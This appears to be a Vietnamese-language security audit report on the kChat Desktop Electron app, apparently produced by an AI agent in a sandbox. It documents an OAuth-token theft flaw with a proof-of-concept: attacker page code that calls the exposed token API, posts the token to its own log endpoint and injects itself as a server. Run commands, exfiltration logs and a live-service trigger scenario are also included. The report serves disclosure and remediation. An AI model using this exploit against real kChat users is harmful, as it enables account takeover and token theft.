# kChat Desktop (Infomaniak/desktop-kChat) – Security Audit Log & Report

- Target: https://github.com/Infomaniak/desktop-kChat @ `ae71674` (fork of mattermost/desktop, upstream ref `7accb3ba`)
- Stack: Electron 37.6.1, electron-updater 6.3.0, React 17
- Phương pháp: đọc toàn bộ main-process / preload / url-utils, so sánh với upstream Mattermost, build lại app trong sandbox (webpack → `dist/`), chạy bằng Xvfb với fake server local. **Không gửi bất kỳ request nào tới hạ tầng Infomaniak** (Electron chạy với `--proxy-server=http://127.0.0.1:9` để chặn egress; chỉ loopback đi được).
- Ghi chú môi trường: 2 package private trên GitHub Packages (`@infomaniak/jitsi-meet-electron-sdk`, `@infomaniak/compass-icons`) không tải được → được stub để build. Phần kMeet (Jitsi SDK) do đó chỉ review tĩnh.

---

## 1. VERIFIED FINDING

### [HIGH → CRITICAL nếu có redirect trigger] Any web origin loaded in a server view can read/overwrite the Infomaniak OAuth token and permanently register itself as a kChat "server"

**Root cause (3 lỗi cộng hưởng, toàn bộ là code kChat-specific, không có ở upstream):**

1. `src/main/views/webContentEvents.ts:78-89` – `generateWillNavigate` chỉ chặn scheme không phải http/https/mailto. Upstream Mattermost (cùng file, commit 7accb3ba, dòng 79-107) chặn mọi navigation không phải `isTeamUrl / isAdminUrl / isLoginUrl / isChannelExportUrl / calls popout`. kChat đã bỏ toàn bộ check này → server view (có preload `externalAPI.js`) có thể bị điều hướng top-level tới **bất kỳ** origin http(s).
2. `src/main/preload/externalAPI.ts:166-181` – `contextBridge.exposeInMainWorld('authManager', {tokenRequest, refreshToken, resetToken, logout, ...})`. Preload chạy cho **mọi** page load trong webContents đó, không phụ thuộc origin.
3. `src/main/views/viewManager.ts:112-118` – các handler `TOKEN_REQUEST`, `REFRESH_TOKEN`, `TOKEN_REFRESHED`, `RESET_TOKEN`, `RESET_AUTH` không kiểm tra `event.sender` / origin. `src/main/app/initialize.ts:239` – `UPDATE_TEAMS` cũng không kiểm tra sender và gọi `ServerManager.manageServersReceivedHandler()` → add server URL tùy ý + **xóa** các server không có trong list (`serverManager.ts:224-251`).

Token được trả về là access token của `login.infomaniak.com` (client `A7376A6D-...`, `tokenManager.ts:37`), được app inject làm `Authorization: Bearer` vào `*.infomaniak.com/api/v4/*`, kdrive, welcome (`initialize.ts:409-430`) → token cấp tài khoản Infomaniak, không chỉ kChat.

**PoC (sandbox, reproduce 100%)** – file trong `kchat-audit/poc/`:

- `kchat-server.js` – giả lập kChat server tại `http://127.0.0.1:8099` (trả `/api/v4/config/client`, `/api/v4/plugins/webapp`, `/api/v4/license/client`), và tại `/` thực hiện top-level navigation sang origin lạ: biến thể A `location.href=...`, biến thể B HTTP `302 Location: http://127.0.0.2:8098/`.
- `attacker.js` – origin lạ `http://127.0.0.2:8098`, trang chỉ chạy:
  ```js
  out.token = await window.authManager.tokenRequest();
  await fetch('/log', {method:'POST', body: JSON.stringify(out)});
  // persistence: self-postMessage → preload forward UPDATE_TEAMS
  window.postMessage({type:'update-teams', message:{teams:[{display_name:'pwned', url:'http://127.0.0.2:8098', id:'x'}]}}, location.origin);
  ```
- `config.json` (teams = lab server), `tokens.json` = `{"token":"IK_ACCESS_TOKEN_SANDBOX_abc123"}` đặt vào userData (`$XDG_CONFIG_HOME/Electron/` khi chạy unpackaged).
- Lệnh chạy:
  ```
  node kchat-server.js & node attacker.js &
  XDG_CONFIG_HOME=$LAB/xdg xvfb-run -a node_modules/.bin/electron dist/ --disable-dev-mode --no-sandbox \
     --password-store=basic --proxy-server=http://127.0.0.1:9 --disable-gpu
  ```

**Evidence (log thực tế, `poc/exfil.log` / `poc/attacker.log`):**

Biến thể A (`location.href`):
```
{"origin":"http://127.0.0.2:8098","via":"?via=location","hasDesktopAPI":"object","hasAuthManager":"object",
 "appInfo":{"name":"Electron","version":"37.6.1"},"token":{"token":"IK_ACCESS_TOKEN_SANDBOX_abc123"}}
```
Biến thể B (302) + persistence:
```
[attacker] GET /?via=302&persist auth=-
[attacker] EXFIL: {... "token":{"token":"IK_ACCESS_TOKEN_SANDBOX_abc123"}}
[attacker] GET /api/v4/config/client?format=old      <- app coi 127.0.0.2 là server mới, fetch server info
[attacker] GET / auth=-                              <- view mới được tạo, load lại trang attacker
[attacker] EXFIL: {... "via":"", "token":{"token":"IK_ACCESS_TOKEN_SANDBOX_abc123"}}
```
`config.json` sau khi chạy (server hợp lệ bị xóa, attacker được ghi vĩnh viễn):
```
[ { "name": "pwned", "url": "http://127.0.0.2:8098/" } ]
```

**Impact thực tế:**
- Đọc token Infomaniak → full account takeover phạm vi token (kChat API, kDrive…), không cần XSS trong webapp.
- `TOKEN_REFRESHED` → ghi đè token của victim bằng token attacker (session fixation); `RESET_AUTH` → logout/clear storage (DoS).
- Persistence: attacker origin trở thành "server" → được load ở mỗi lần khởi động với preload đầy quyền; và vì `permissionsManager.ts:56,160-175` lưu permission **toàn cục** (`commons`, không theo origin) và `isTrustedURL(parsedURL, serverURL)` so với chính URL server attacker → nếu user đã từng Allow `media`/`notifications` cho kChat, origin attacker được cấp camera/mic **không có prompt**. (Phần media này suy ra từ code, chưa chạy dynamic vì sandbox không có thiết bị.)

**Trigger thực tế (NEEDS MANUAL VERIFICATION trên kChat live):** cần một top-level navigation trong server view ra origin ngoài. Ứng viên đã xác nhận ở upstream Mattermost webapp: trang `/oauth/authorize` (`webapp/channels/src/components/authorize/authorize.tsx` L77 và L88) làm `window.location.href = redirect_uri` ở **cả nút Allow và Deny**. Kịch bản: attacker tạo OAuth 2.0 app trên tenant kChat mà victim là member (vd. tenant của attacker, victim được invite), gửi link `https://<tenant>.kchat.infomaniak.com/oauth/authorize?client_id=…&response_type=code&redirect_uri=https://attacker` (hoặc deep link `kchat://…` → `viewManager.handleDeepLink`) → victim bấm Allow/Deny → view điều hướng sang attacker với `window.authManager` → token bị đọc. Cần kiểm tra: (a) kChat có cho org admin tạo OAuth app không; (b) webapp kChat có giữ hành vi redirect này không; (c) bất kỳ open redirect nào khác trên `*.kchat.infomaniak.com` cũng đủ làm trigger.

**Severity:** High (CVSS 3.1 ~8.1 AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N với precondition trigger). Nếu xác nhận trigger không cần tương tác (open redirect) → Critical.

**Remediation:**
- Khôi phục allow-list trong `generateWillNavigate` như upstream (chỉ cho `isTeamUrl/isAdminUrl/isLoginUrl/...`, thêm `login.infomaniak.com` nếu cần), `event.preventDefault()` cho mọi URL khác.
- Mọi `ipcMain.handle/on` nhạy cảm (`TOKEN_*`, `RESET_AUTH`, `UPDATE_TEAMS`, `CALL_OPEN_WINDOW`…) phải verify `event.senderFrame.url` thuộc origin server đã cấu hình / `IKOrigin`.
- `UPDATE_TEAMS`: chỉ chấp nhận URL khớp `*.kchat.infomaniak.com` (hoặc danh sách từ `IKOrigin`), không cho remove server dựa trên dữ liệu renderer.
- Permission store theo origin thay vì `commons`.

---

## 2. OBSERVATIONS – chưa đủ bằng chứng, không report như finding

| # | Vấn đề | Vị trí | Vì sao chưa report |
|---|---|---|---|
| O1 | kMeet call window: `nodeIntegration:true, contextIsolation:false, sandbox:false, webSecurity:false` + `disable-site-isolation-trials`; load script remote `${server}/static/kmeet.js`; `windowOpenHandler` trả `{action:'allow'}` cho target `electron` (child window kế thừa webPreferences → Node). | `kmeetCallWindow.ts:181-230`, `app.ts:25` | Cần attacker-controlled content trong iframe Jitsi/popup. SDK private không có → chưa test. Nếu tìm được XSS/redirect trong kmeet.infomaniak.com hoặc popup target `electron` → RCE. |
| O2 | Token inject vào `https://*.infomaniak.com/api/v4/*` (wildcard subdomain). | `constants.ts:111-120`, `initialize.ts:409` | Chỉ thành bug nếu tồn tại host `*.infomaniak.com` do user kiểm soát / subdomain takeover. Cần recon DNS (ngoài scope source review). |
| O3 | `webRequestOnHeadersReceivedHandler`: `headers['content-disposition'].join()` không null-check → TypeError nếu response gzip + `x-uncompressed-content-length` nhưng thiếu content-disposition. | `downloadsManager.ts:131` | Filter chỉ áp dụng `login.infomaniak.com/*` → Infomaniak-controlled, impact thấp. |
| O4 | `--data-dir` làm app crash (`ipcMain.handle('refresh-permission')` đăng ký 2 lần khi `UPDATE_PATHS`). | `permissionsManager.ts:73,296-302` | Local-only, không phải security. Đã gặp khi dựng lab. |

## 3. CHECKED – OK (không có lỗi)

- Deep link `kchat://` → `handleDeepLink` chỉ map vào server đã cấu hình, URL được dựng lại từ `view.url.origin` (viewManager.ts:331-345).
- `kchat-desktop://` protocol handler có guard path traversal (`initialize.ts:374-392`); scheme không expose fetch/CORS.
- Downloads: filename từ `item.getFilename()` (đã sanitize bởi Chromium), download không có user gesture luôn hiện Save dialog.
- Dependency confusion: `.npmrc` scope `@infomaniak` → `npm.pkg.github.com`, scope `@infomaniak` trên npmjs thuộc Infomaniak → không khai thác được.
- `electron-updater` patch: chuyển sang `-EncodedCommand`, `shell:false` → an toàn hơn upstream; feed S3 HTTPS.
- Plugin popups (`pluginsPopUps.ts`), calls widget (`callsWidgetWindow.ts`), certificate error handling (`app.ts:105-200`), `AuthManager` basic-auth: giữ nguyên upstream, không regress.
- CSP cho trang nội bộ `kchat-desktop://*.html`: `default-src 'self'` + nonce style.

## 4. Artefacts

- Source + build: `/tmp/claude-0/-home-user-duc161616/398953e5-76b6-580d-a7ea-3b07bd341d58/scratchpad/target/desktop-kChat` (`dist/` đã build)
- Lab: `/tmp/claude-0/-home-user-duc161616/398953e5-76b6-580d-a7ea-3b07bd341d58/scratchpad/lab` (servers, userData `xdg/Electron`, `electron.log`)
- Bản copy PoC + log: `/home/user/duc161616/kchat-audit/poc/`
